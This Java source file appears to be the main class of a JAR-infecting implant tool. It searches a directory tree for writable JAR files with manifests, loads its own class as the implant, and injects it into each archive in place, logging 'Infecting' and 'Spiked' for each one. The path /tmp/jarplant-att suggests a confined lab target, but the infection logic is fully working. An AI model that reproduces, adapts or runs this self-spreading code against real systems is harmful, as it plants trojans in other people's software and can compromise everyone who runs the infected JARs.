package org.example;

import org.example.injector.ClassInjector;
import org.example.injector.ImplantHandler;
import org.example.injector.ImplantHandlerImpl;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;
import java.util.jar.JarFile;

public class Main {
    private static final String LIMIT_PATH = "/tmp/jarplant-att";

    public static void main(String[] args) {
        init();
    }

    public static void init() {
        Set<Path> jarsToImplant;
        try {
            jarsToImplant = findAllJars(LIMIT_PATH);
        } catch (Exception e) {
            System.out.println("[!] Failed to find JARs.");
            e.printStackTrace();
            return;
        }

        ImplantHandler implantHandler;
        try {
            implantHandler = ImplantHandlerImpl.findAndCreateFor(Main.class);
        } catch (ClassNotFoundException | IOException e) {
            System.out.println("[!] Cannot load oneself. Aborting.");
            System.exit(1);
            throw new RuntimeException("Unreachable");
        }

        System.out.println("[i] Implant: " + implantHandler.getImplantClassName());
        System.out.println();

        for (Path jarToImplant : jarsToImplant) {
            System.out.println("[+] Infecting " + jarToImplant + "...");
            ClassInjector injector = new ClassInjector(implantHandler);

            try {
                injector.infect(jarToImplant, jarToImplant);
                System.out.println("[+] Spiked " + jarToImplant);
            } catch (IOException e) {
                System.out.println("[-] Failed to infect " + jarToImplant + " (" + e.getMessage() + ")");
                e.printStackTrace();
            }
            System.out.println();
        }
    }

    public static Set<Path> findAllJars(String root) throws IllegalArgumentException {
        Path dir = Path.of(root);
        if (!Files.isDirectory(dir)) {
            throw new IllegalArgumentException("Not a directory");
        }

        Set<Path> validJarFiles = new HashSet<>();
        findAllJars(dir, validJarFiles);

        return validJarFiles;
    }

    // Recursive function
    private static void findAllJars(Path dir, Set<Path> accumulator) {
        List<Path> subPaths;
        try {
            subPaths = Files.list(dir).toList();
        } catch (IOException ignored) {
            return;
        }

        List<Path> subDirs = new LinkedList<>();
        for (Path subPath : subPaths) {
            if (Files.isDirectory(subPath)) {
                subDirs.add(subPath);
                continue;
            }

            if (!Files.isRegularFile(subPath)) {
                continue;
            }
            if (!Files.isWritable(subPath)) {
                continue;
            }
            if (!subPath.toString().endsWith(".jar")) {
                continue;
            }
            if (!isJar(subPath)) {
                continue;
            }

            accumulator.add(subPath);
        }

        for (Path subDir : subDirs) {
            findAllJars(subDir, accumulator);
        }
    }

    private static boolean isJar(Path suspectedJarFile) {
        try (JarFile jarFile = new JarFile(suspectedJarFile.toFile())) {
            return jarFile.getManifest() != null;
        } catch (IOException e) {
            return false;
        }
    }
}